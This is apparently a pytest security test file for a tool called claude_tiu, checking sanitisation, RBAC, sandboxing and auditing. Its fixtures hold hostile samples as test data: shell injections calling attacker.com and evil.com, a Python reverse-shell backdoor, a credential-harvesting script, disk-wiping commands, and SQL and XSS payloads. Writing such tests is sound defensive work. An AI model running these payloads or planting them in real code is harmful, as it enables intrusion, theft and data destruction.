"""Comprehensive security tests for vulnerability assessment and penetration testing."""

import pytest
import asyncio
import os
import tempfile
import subprocess
import hashlib
import secrets
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from pathlib import Path
from typing import List, Dict, Any

from claude_tiu.core.config_manager import ConfigManager, SecurityConfig
from claude_tiu.middleware.security_middleware import SecurityMiddleware
from claude_tiu.middleware.rbac import RBACManager
from claude_tiu.validation.anti_hallucination_engine import AntiHallucinationEngine
from claude_tiu.integrations.ai_interface import AIInterface


@pytest.fixture
def security_config():
    """Security configuration for testing."""
    return SecurityConfig(
        sandbox_enabled=True,
        max_file_size_mb=10,
        allowed_file_extensions=['.py', '.js', '.json', '.yaml', '.txt'],
        blocked_commands=['rm -rf', 'del', 'format', 'fdisk', 'dd'],
        api_key_rotation_days=90,
        audit_logging=True
    )


@pytest.fixture
def mock_config_manager(security_config):
    """Mock configuration manager with security settings."""
    manager = Mock(spec=ConfigManager)
    manager.get_security_config.return_value = security_config
    manager.get_setting = AsyncMock(side_effect=lambda path, default=None: {
        'security.sandbox_enabled': True,
        'security.max_file_size_mb': 10,
        'security.audit_logging': True,
        'security.api_key_rotation_days': 90
    }.get(path, default))
    return manager


@pytest.fixture
def security_middleware(mock_config_manager):
    """Security middleware instance."""
    return SecurityMiddleware(mock_config_manager)


@pytest.fixture
def rbac_manager(mock_config_manager):
    """RBAC manager instance."""
    return RBACManager(mock_config_manager)


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_sql_injection_prevention(self, security_middleware):
        """Test SQL injection attack prevention."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "'; DELETE FROM projects WHERE 1=1; --",
            "1' UNION SELECT password FROM users --"
        ]
        
        for malicious_input in malicious_inputs:
            # Test input sanitization
            sanitized = security_middleware.sanitize_input(malicious_input)
            
            # Verify dangerous SQL patterns are neutralized
            assert "DROP TABLE" not in sanitized.upper()
            assert "DELETE FROM" not in sanitized.upper()
            assert "UNION SELECT" not in sanitized.upper()
            assert "--" not in sanitized
    
    def test_xss_prevention(self, security_middleware):
        """Test Cross-Site Scripting (XSS) prevention."""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("XSS")',
            '<svg onload="alert(1)">',
            '"><script>alert(document.cookie)</script>',
            '<iframe src="javascript:alert(1)"></iframe>'
        ]
        
        for payload in xss_payloads:
            sanitized = security_middleware.sanitize_html_input(payload)
            
            # Verify dangerous JavaScript patterns are neutralized
            assert '<script>' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert 'onerror=' not in sanitized.lower()
            assert 'onload=' not in sanitized.lower()
            assert '<iframe' not in sanitized.lower()
    
    def test_command_injection_prevention(self, security_middleware):
        """Test command injection prevention."""
        command_injections = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            "; curl evil.com/malware | sh"
        ]
        
        for injection in command_injections:
            is_safe = security_middleware.validate_command_input(injection)
            
            # Command injection attempts should be rejected
            assert is_safe is False
    
    def test_path_traversal_prevention(self, security_middleware):
        """Test path traversal attack prevention."""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for traversal in path_traversals:
            is_safe = security_middleware.validate_file_path(traversal)
            
            # Path traversal attempts should be rejected
            assert is_safe is False
    
    def test_file_upload_validation(self, security_middleware):
        """Test file upload security validation."""
        # Test allowed file types
        allowed_files = [
            "script.py",
            "config.json",
            "data.yaml",
            "README.txt"
        ]
        
        for filename in allowed_files:
            is_valid = security_middleware.validate_file_upload(filename, b"safe content")
            assert is_valid is True
        
        # Test blocked file types
        blocked_files = [
            "malware.exe",
            "script.bat",
            "payload.sh",
            "virus.vbs",
            "trojan.scr"
        ]
        
        for filename in blocked_files:
            is_valid = security_middleware.validate_file_upload(filename, b"potentially malicious")
            assert is_valid is False
    
    def test_file_size_limits(self, security_middleware):
        """Test file size limit enforcement."""
        # Test file within size limits
        small_content = b"small file content"
        assert security_middleware.validate_file_size(small_content) is True
        
        # Test oversized file
        large_content = b"x" * (15 * 1024 * 1024)  # 15MB file
        assert security_middleware.validate_file_size(large_content) is False
    
    def test_malicious_content_detection(self, security_middleware):
        """Test detection of malicious file content."""
        malicious_contents = [
            b"\\x4d\\x5a\\x90\\x00",  # PE executable header
            b"#!/bin/bash\\nrm -rf /",  # Dangerous shell script
            b"<script>window.location='http://evil.com'</script>",  # Malicious HTML
            b"eval($_POST['cmd']);",  # PHP backdoor
            b"import os; os.system('rm -rf /')"  # Malicious Python
        ]
        
        for content in malicious_contents:
            is_safe = security_middleware.scan_file_content(content)
            assert is_safe is False


class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_password_strength_validation(self, security_middleware):
        """Test password strength requirements."""
        weak_passwords = [
            "password",
            "123456",
            "admin",
            "test",
            "qwerty",
            "password123"
        ]
        
        for password in weak_passwords:
            is_strong = security_middleware.validate_password_strength(password)
            assert is_strong is False
        
        strong_passwords = [
            "MyStr0ngP@ssw0rd!",
            "C0mpl3x$ecur3P@ss",
            "Un!qu3&Str0ng#2024"
        ]
        
        for password in strong_passwords:
            is_strong = security_middleware.validate_password_strength(password)
            assert is_strong is True
    
    def test_session_security(self, security_middleware):
        """Test session management security."""
        # Test secure session token generation
        token1 = security_middleware.generate_session_token()
        token2 = security_middleware.generate_session_token()
        
        # Tokens should be unique and sufficiently long
        assert token1 != token2
        assert len(token1) >= 32
        assert len(token2) >= 32
        
        # Test session validation
        valid_session = security_middleware.create_session("test_user", "127.0.0.1")
        assert security_middleware.validate_session(valid_session['token']) is True
        
        # Test session expiration
        expired_session = security_middleware.create_session(
            "test_user", "127.0.0.1", expires_in=-1
        )
        assert security_middleware.validate_session(expired_session['token']) is False
    
    def test_rate_limiting(self, security_middleware):
        """Test rate limiting for authentication attempts."""
        user_id = "test_user"
        
        # Simulate multiple failed attempts
        for i in range(5):
            result = security_middleware.record_failed_attempt(user_id)
            if i < 3:
                assert result['blocked'] is False
            else:
                assert result['blocked'] is True
                
        # Test rate limit reset
        security_middleware.reset_rate_limit(user_id)
        result = security_middleware.record_failed_attempt(user_id)
        assert result['blocked'] is False
    
    def test_api_key_security(self, security_middleware):
        """Test API key security measures."""
        # Test API key generation
        api_key = security_middleware.generate_api_key("test_service")
        
        assert len(api_key) >= 32
        assert api_key.startswith("claude_tiu_")
        
        # Test API key validation
        assert security_middleware.validate_api_key(api_key) is True
        assert security_middleware.validate_api_key("invalid_key") is False
        
        # Test API key rotation
        old_key = api_key
        new_key = security_middleware.rotate_api_key("test_service")
        
        assert new_key != old_key
        assert security_middleware.validate_api_key(old_key) is False
        assert security_middleware.validate_api_key(new_key) is True


class TestRBACSystem:
    """Test Role-Based Access Control system."""
    
    def test_role_management(self, rbac_manager):
        """Test role creation and management."""
        # Create roles
        rbac_manager.create_role("admin", [
            "read", "write", "delete", "manage_users", "system_config"
        ])
        rbac_manager.create_role("developer", [
            "read", "write", "execute_tasks"
        ])
        rbac_manager.create_role("viewer", [
            "read"
        ])
        
        # Test role existence
        assert rbac_manager.role_exists("admin") is True
        assert rbac_manager.role_exists("developer") is True
        assert rbac_manager.role_exists("viewer") is True
        assert rbac_manager.role_exists("nonexistent") is False
        
        # Test role permissions
        admin_perms = rbac_manager.get_role_permissions("admin")
        assert "manage_users" in admin_perms
        assert "system_config" in admin_perms
        
        viewer_perms = rbac_manager.get_role_permissions("viewer")
        assert "read" in viewer_perms
        assert "write" not in viewer_perms
    
    def test_user_role_assignment(self, rbac_manager):
        """Test user role assignment and validation."""
        # Setup roles
        rbac_manager.create_role("admin", ["read", "write", "delete"])
        rbac_manager.create_role("developer", ["read", "write"])
        
        # Assign roles to users
        rbac_manager.assign_user_role("admin_user", "admin")
        rbac_manager.assign_user_role("dev_user", "developer")
        
        # Test role assignments
        assert rbac_manager.user_has_role("admin_user", "admin") is True
        assert rbac_manager.user_has_role("dev_user", "developer") is True
        assert rbac_manager.user_has_role("dev_user", "admin") is False
    
    def test_permission_checking(self, rbac_manager):
        """Test permission checking and enforcement."""
        # Setup roles and users
        rbac_manager.create_role("admin", ["read", "write", "delete", "manage_system"])
        rbac_manager.create_role("user", ["read", "write"])
        
        rbac_manager.assign_user_role("admin_user", "admin")
        rbac_manager.assign_user_role("regular_user", "user")
        
        # Test admin permissions
        assert rbac_manager.user_has_permission("admin_user", "read") is True
        assert rbac_manager.user_has_permission("admin_user", "write") is True
        assert rbac_manager.user_has_permission("admin_user", "delete") is True
        assert rbac_manager.user_has_permission("admin_user", "manage_system") is True
        
        # Test regular user permissions
        assert rbac_manager.user_has_permission("regular_user", "read") is True
        assert rbac_manager.user_has_permission("regular_user", "write") is True
        assert rbac_manager.user_has_permission("regular_user", "delete") is False
        assert rbac_manager.user_has_permission("regular_user", "manage_system") is False
    
    def test_resource_access_control(self, rbac_manager):
        """Test resource-level access control."""
        # Setup roles with resource-specific permissions
        rbac_manager.create_role("project_owner", ["project:read", "project:write", "project:delete"])
        rbac_manager.create_role("project_collaborator", ["project:read", "project:write"])
        rbac_manager.create_role("project_viewer", ["project:read"])
        
        rbac_manager.assign_user_role("owner", "project_owner")
        rbac_manager.assign_user_role("collaborator", "project_collaborator")
        rbac_manager.assign_user_role("viewer", "project_viewer")
        
        # Test resource access
        test_cases = [
            ("owner", "project:delete", True),
            ("collaborator", "project:delete", False),
            ("viewer", "project:write", False),
            ("viewer", "project:read", True)
        ]
        
        for user, permission, expected in test_cases:
            result = rbac_manager.user_has_permission(user, permission)
            assert result == expected


class TestSecureCodeGeneration:
    """Test security in AI code generation."""
    
    @pytest.mark.asyncio
    async def test_malicious_code_detection(self, mock_config_manager):
        """Test detection of malicious code in AI generation."""
        with patch('claude_tiu.validation.anti_hallucination_engine.load_models'), \
             patch('claude_tiu.validation.anti_hallucination_engine.initialize_neural_networks'):
            
            engine = AntiHallucinationEngine(mock_config_manager)
            await engine.initialize()
            
            malicious_code_samples = [
                # System command execution
                "import os; os.system('rm -rf /')",
                
                # Network backdoor
                """
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
while True:
    cmd = s.recv(1024).decode()
    os.system(cmd)
""",
                
                # File system manipulation
                """
import shutil
import os
shutil.rmtree('/usr/local')
os.system('format C:')
""",
                
                # Process manipulation
                """
import subprocess
subprocess.run(['sudo', 'dd', 'if=/dev/zero', 'of=/dev/sda'])
""",
                
                # Credential theft
                """
import os
passwords = []
for root, dirs, files in os.walk('/'):
    for file in files:
        if 'password' in file or 'passwd' in file:
            try:
                with open(os.path.join(root, file)) as f:
                    passwords.append(f.read())
            except:
                pass
"""
            ]
            
            with patch.object(engine, '_detect_security_issues') as mock_detect:
                # Mock security issue detection
                mock_detect.return_value = [
                    Mock(severity='CRITICAL', message='Malicious command detected')
                ]
                
                for code in malicious_code_samples:
                    result = await engine.validate_content(
                        content=code,
                        context={'language': 'python', 'security_scan': True}
                    )
                    
                    # Malicious code should be flagged
                    mock_detect.assert_called()
    
    @pytest.mark.asyncio
    async def test_sensitive_data_detection(self, mock_config_manager):
        """Test detection of sensitive data in generated code."""
        with patch('claude_tiu.validation.anti_hallucination_engine.load_models'), \
             patch('claude_tiu.validation.anti_hallucination_engine.initialize_neural_networks'):
            
            engine = AntiHallucinationEngine(mock_config_manager)
            await engine.initialize()
            
            sensitive_code_samples = [
                # API keys
                'API_KEY = "sk-1234567890abcdef1234567890abcdef"',
                
                # Passwords
                'PASSWORD = "admin123"\\nDATABASE_URL = "postgresql://user:password@host:5432/db"',
                
                # Private keys
                """
PRIVATE_KEY = '''-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7...
-----END PRIVATE KEY-----'''
""",
                
                # Database credentials
                """
config = {
    'host': 'prod-db.company.com',
    'username': 'admin',
    'password': 'super_secret_password123',
    'database': 'production'
}
"""
            ]
            
            with patch.object(engine, '_detect_sensitive_data') as mock_detect:
                # Mock sensitive data detection
                mock_detect.return_value = [
                    Mock(severity='HIGH', message='Sensitive data detected')
                ]
                
                for code in sensitive_code_samples:
                    result = await engine.validate_content(
                        content=code,
                        context={'language': 'python', 'scan_sensitive_data': True}
                    )
                    
                    # Sensitive data should be flagged
                    mock_detect.assert_called()
    
    @pytest.mark.asyncio
    async def test_insecure_coding_patterns(self, mock_config_manager):
        """Test detection of insecure coding patterns."""
        with patch('claude_tiu.validation.anti_hallucination_engine.load_models'), \
             patch('claude_tiu.validation.anti_hallucination_engine.initialize_neural_networks'):
            
            engine = AntiHallucinationEngine(mock_config_manager)
            await engine.initialize()
            
            insecure_patterns = [
                # SQL injection vulnerability
                """
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = '{user_id}'"
    return execute_query(query)
""",
                
                # Command injection vulnerability
                """
def process_file(filename):
    os.system(f"cat {filename}")
""",
                
                # Hardcoded secrets
                """
def connect_to_api():
    api_key = "hardcoded-api-key-123"
    return requests.get(f"https://api.example.com/data?key={api_key}")
""",
                
                # Insecure randomness
                """
import random
def generate_token():
    return ''.join(random.choice('abcdef0123456789') for _ in range(32))
""",
                
                # Unsafe deserialization
                """
import pickle
def load_data(data):
    return pickle.loads(data)
"""
            ]
            
            with patch.object(engine, '_detect_insecure_patterns') as mock_detect:
                # Mock insecure pattern detection
                mock_detect.return_value = [
                    Mock(severity='HIGH', message='Insecure coding pattern detected')
                ]
                
                for code in insecure_patterns:
                    result = await engine.validate_content(
                        content=code,
                        context={'language': 'python', 'security_analysis': True}
                    )
                    
                    # Insecure patterns should be flagged
                    mock_detect.assert_called()


class TestEncryptionSecurity:
    """Test encryption and cryptographic security."""
    
    def test_configuration_encryption(self, mock_config_manager):
        """Test secure configuration data encryption."""
        # Test with actual ConfigManager encryption
        config_manager = ConfigManager()
        
        # Mock encryption key generation
        with patch.object(config_manager, '_initialize_encryption') as mock_encrypt:
            encryption_key = Fernet.generate_key()
            config_manager._encryption_key = encryption_key
            mock_encrypt.return_value = None
            
            # Test API key encryption
            test_api_key = "test-api-key-12345"
            
            # Encrypt the key
            fernet = Fernet(encryption_key)
            encrypted_key = fernet.encrypt(test_api_key.encode())
            
            # Verify encryption
            assert encrypted_key != test_api_key.encode()
            
            # Verify decryption
            decrypted_key = fernet.decrypt(encrypted_key).decode()
            assert decrypted_key == test_api_key
    
    def test_secure_token_generation(self, security_middleware):
        """Test cryptographically secure token generation."""
        # Generate multiple tokens
        tokens = [security_middleware.generate_secure_token() for _ in range(100)]
        
        # Verify uniqueness
        assert len(set(tokens)) == 100  # All tokens should be unique
        
        # Verify length and entropy
        for token in tokens[:10]:  # Test first 10 tokens
            assert len(token) >= 32  # Minimum length
            assert any(c.islower() for c in token)  # Contains lowercase
            assert any(c.isupper() for c in token)  # Contains uppercase
            assert any(c.isdigit() for c in token)  # Contains digits
    
    def test_password_hashing(self, security_middleware):
        """Test secure password hashing."""
        password = "test_password_123"
        
        # Hash password
        hashed1 = security_middleware.hash_password(password)
        hashed2 = security_middleware.hash_password(password)
        
        # Same password should produce different hashes (due to salt)
        assert hashed1 != hashed2
        
        # Verify password verification works
        assert security_middleware.verify_password(password, hashed1) is True
        assert security_middleware.verify_password(password, hashed2) is True
        assert security_middleware.verify_password("wrong_password", hashed1) is False
    
    def test_cryptographic_integrity(self, security_middleware):
        """Test data integrity using cryptographic signatures."""
        data = "important data that needs integrity verification"
        
        # Generate signature
        signature = security_middleware.sign_data(data)
        
        # Verify signature
        assert security_middleware.verify_signature(data, signature) is True
        
        # Verify tampered data fails verification
        tampered_data = data + " tampered"
        assert security_middleware.verify_signature(tampered_data, signature) is False
        
        # Verify invalid signature fails
        invalid_signature = "invalid_signature"
        assert security_middleware.verify_signature(data, invalid_signature) is False


class TestSandboxSecurity:
    """Test sandboxing and isolation security."""
    
    def test_process_sandboxing(self, security_middleware):
        """Test process execution sandboxing."""
        # Test safe commands
        safe_commands = [
            ["echo", "hello"],
            ["python", "-c", "print('safe')"],
            ["ls", "-la"]
        ]
        
        for cmd in safe_commands:
            result = security_middleware.execute_sandboxed_command(cmd)
            assert result['allowed'] is True
        
        # Test dangerous commands
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["sudo", "anything"],
            ["chmod", "777", "/etc/passwd"],
            ["dd", "if=/dev/zero", "of=/dev/sda"]
        ]
        
        for cmd in dangerous_commands:
            result = security_middleware.execute_sandboxed_command(cmd)
            assert result['allowed'] is False
    
    def test_file_system_restrictions(self, security_middleware):
        """Test file system access restrictions."""
        # Test allowed paths
        allowed_paths = [
            "/tmp/test_file.txt",
            "/home/user/project/file.py",
            "/var/log/application.log"
        ]
        
        for path in allowed_paths:
            assert security_middleware.is_path_allowed(path) is True
        
        # Test restricted paths
        restricted_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/proc/1/mem",
            "/sys/kernel/debug",
            "/dev/kmem"
        ]
        
        for path in restricted_paths:
            assert security_middleware.is_path_allowed(path) is False
    
    def test_resource_limits(self, security_middleware):
        """Test resource usage limits in sandbox."""
        # Test memory limit
        memory_limit_mb = 512
        result = security_middleware.check_memory_usage(memory_limit_mb * 1024 * 1024)
        assert result['within_limit'] is True
        
        oversized_memory = (memory_limit_mb + 100) * 1024 * 1024
        result = security_middleware.check_memory_usage(oversized_memory)
        assert result['within_limit'] is False
        
        # Test CPU time limit
        cpu_limit_seconds = 30
        result = security_middleware.check_cpu_usage(cpu_limit_seconds - 5)
        assert result['within_limit'] is True
        
        excessive_cpu = cpu_limit_seconds + 10
        result = security_middleware.check_cpu_usage(excessive_cpu)
        assert result['within_limit'] is False
    
    def test_network_restrictions(self, security_middleware):
        """Test network access restrictions in sandbox."""
        # Test allowed network operations
        allowed_operations = [
            {'host': 'api.anthropic.com', 'port': 443, 'protocol': 'https'},
            {'host': 'github.com', 'port': 443, 'protocol': 'https'},
            {'host': 'pypi.org', 'port': 443, 'protocol': 'https'}
        ]
        
        for operation in allowed_operations:
            result = security_middleware.check_network_access(**operation)
            assert result['allowed'] is True
        
        # Test blocked network operations
        blocked_operations = [
            {'host': 'malware.com', 'port': 80, 'protocol': 'http'},
            {'host': '192.168.1.1', 'port': 22, 'protocol': 'ssh'},
            {'host': 'localhost', 'port': 4444, 'protocol': 'tcp'}
        ]
        
        for operation in blocked_operations:
            result = security_middleware.check_network_access(**operation)
            assert result['allowed'] is False


class TestSecurityAuditing:
    """Test security auditing and logging."""
    
    def test_security_event_logging(self, security_middleware):
        """Test security event logging and auditing."""
        # Mock audit logger
        audit_events = []
        
        def mock_audit_log(event_type, details):
            audit_events.append({
                'event_type': event_type,
                'details': details,
                'timestamp': 'mock_timestamp'
            })
        
        security_middleware.audit_log = mock_audit_log
        
        # Test various security events
        security_middleware.log_failed_authentication("test_user", "invalid_password")
        security_middleware.log_suspicious_activity("potential_sql_injection", "'; DROP TABLE")
        security_middleware.log_file_access_violation("/etc/passwd", "unauthorized_read")
        security_middleware.log_privilege_escalation("user", "admin")
        
        # Verify events were logged
        assert len(audit_events) == 4
        
        event_types = [event['event_type'] for event in audit_events]
        assert 'failed_authentication' in event_types
        assert 'suspicious_activity' in event_types
        assert 'file_access_violation' in event_types
        assert 'privilege_escalation' in event_types
    
    def test_intrusion_detection(self, security_middleware):
        """Test intrusion detection system."""
        # Simulate attack patterns
        attack_patterns = [
            {'type': 'brute_force', 'attempts': 10, 'timeframe': 60},
            {'type': 'sql_injection', 'payload': "' OR 1=1 --", 'endpoint': '/api/users'},
            {'type': 'path_traversal', 'payload': '../../../etc/passwd', 'endpoint': '/files'},
            {'type': 'xss_attempt', 'payload': '<script>alert(1)</script>', 'endpoint': '/comments'}
        ]
        
        for pattern in attack_patterns:
            detection_result = security_middleware.detect_intrusion(pattern)
            
            # All attack patterns should be detected
            assert detection_result['detected'] is True
            assert detection_result['threat_level'] in ['HIGH', 'CRITICAL']
            assert 'mitigation' in detection_result
    
    def test_vulnerability_scanning(self, security_middleware):
        """Test automated vulnerability scanning."""
        # Mock vulnerable code samples
        vulnerable_code_samples = [
            {
                'code': 'eval(user_input)',
                'vulnerability': 'code_injection',
                'severity': 'CRITICAL'
            },
            {
                'code': 'md5(password)',
                'vulnerability': 'weak_hashing',
                'severity': 'HIGH'
            },
            {
                'code': 'http://example.com/api',
                'vulnerability': 'insecure_protocol',
                'severity': 'MEDIUM'
            }
        ]
        
        for sample in vulnerable_code_samples:
            scan_result = security_middleware.scan_vulnerability(sample['code'])
            
            # Vulnerabilities should be detected
            assert len(scan_result['vulnerabilities']) > 0
            assert any(vuln['type'] == sample['vulnerability'] 
                      for vuln in scan_result['vulnerabilities'])
    
    def test_compliance_checking(self, security_middleware):
        """Test security compliance checking."""
        # Test OWASP Top 10 compliance
        owasp_checks = [
            'injection_prevention',
            'broken_authentication',
            'sensitive_data_exposure',
            'xml_external_entities',
            'broken_access_control',
            'security_misconfiguration',
            'cross_site_scripting',
            'insecure_deserialization',
            'known_vulnerabilities',
            'insufficient_logging'
        ]
        
        compliance_results = {}
        for check in owasp_checks:
            result = security_middleware.check_owasp_compliance(check)
            compliance_results[check] = result
            
            # Each check should return a result
            assert 'compliant' in result
            assert 'issues' in result
            assert 'recommendations' in result
        
        # Calculate overall compliance score
        compliant_checks = sum(1 for result in compliance_results.values() 
                             if result['compliant'])
        compliance_score = compliant_checks / len(owasp_checks)
        
        # Should have reasonable compliance (adjust threshold as needed)
        assert compliance_score >= 0.7  # 70% compliance minimum


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security components."""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security_workflow(self, mock_config_manager):
        """Test complete security workflow integration."""
        # Initialize security components
        security_middleware = SecurityMiddleware(mock_config_manager)
        rbac_manager = RBACManager(mock_config_manager)
        
        # Setup test scenario: user attempting to access restricted resource
        user_id = "test_user"
        resource = "sensitive_project"
        operation = "delete"
        
        # Step 1: Authenticate user
        auth_result = security_middleware.authenticate_user(user_id, "password123")
        
        # Step 2: Check RBAC permissions
        rbac_manager.create_role("project_admin", ["project:delete"])
        rbac_manager.assign_user_role(user_id, "project_admin")
        
        has_permission = rbac_manager.user_has_permission(user_id, f"project:{operation}")
        
        # Step 3: Validate request for security
        request_data = f"{operation}:{resource}"
        is_safe_request = security_middleware.validate_request(request_data)
        
        # Step 4: Log security event
        security_middleware.audit_log("resource_access", {
            'user': user_id,
            'resource': resource,
            'operation': operation,
            'permitted': has_permission and is_safe_request
        })
        
        # Verify security workflow
        assert has_permission is True  # User should have permission
        # The request validation and audit logging should complete without errors
    
    @pytest.mark.asyncio
    async def test_security_under_load(self, mock_config_manager):
        """Test security system performance under load."""
        security_middleware = SecurityMiddleware(mock_config_manager)
        
        # Simulate concurrent security checks
        async def security_check(check_id):
            # Simulate various security operations
            await asyncio.sleep(0.001)  # Small delay to simulate processing
            
            # Input validation
            malicious_input = f"'; DROP TABLE test_{check_id}; --"
            is_safe = security_middleware.sanitize_input(malicious_input)
            
            # Permission check
            has_access = security_middleware.check_access(f"user_{check_id}", "read")
            
            # Audit logging
            security_middleware.audit_log("security_check", {
                'check_id': check_id,
                'safe_input': bool(is_safe),
                'has_access': has_access
            })
            
            return {
                'check_id': check_id,
                'completed': True,
                'safe': bool(is_safe),
                'access': has_access
            }
        
        # Run multiple concurrent security checks
        security_tasks = [security_check(i) for i in range(50)]
        results = await asyncio.gather(*security_tasks)
        
        # Verify all security checks completed
        assert len(results) == 50
        assert all(result['completed'] for result in results)
        
        # Verify security measures are working
        assert all('safe' in result for result in results)


@pytest.mark.benchmark
class TestSecurityPerformance:
    """Performance benchmarks for security operations."""
    
    def test_input_sanitization_performance(self, benchmark, security_middleware):
        """Benchmark input sanitization performance."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "`rm -rf /`",
            "eval($_POST['cmd'])"
        ] * 100  # 500 total inputs
        
        def sanitize_inputs():
            results = []
            for malicious_input in malicious_inputs:
                sanitized = security_middleware.sanitize_input(malicious_input)
                results.append(sanitized)
            return results
        
        results = benchmark(sanitize_inputs)
        
        # Verify all inputs were processed
        assert len(results) == 500
    
    def test_permission_check_performance(self, benchmark, rbac_manager):
        """Benchmark permission checking performance."""
        # Setup roles and users
        rbac_manager.create_role("admin", ["read", "write", "delete"])
        for i in range(100):
            rbac_manager.assign_user_role(f"user_{i}", "admin")
        
        def check_permissions():
            results = []
            for i in range(100):
                has_read = rbac_manager.user_has_permission(f"user_{i}", "read")
                has_write = rbac_manager.user_has_permission(f"user_{i}", "write")
                has_delete = rbac_manager.user_has_permission(f"user_{i}", "delete")
                results.append((has_read, has_write, has_delete))
            return results
        
        results = benchmark(check_permissions)
        
        # Verify all permission checks completed
        assert len(results) == 100
        assert all(all(perms) for perms in results)  # All should have all permissions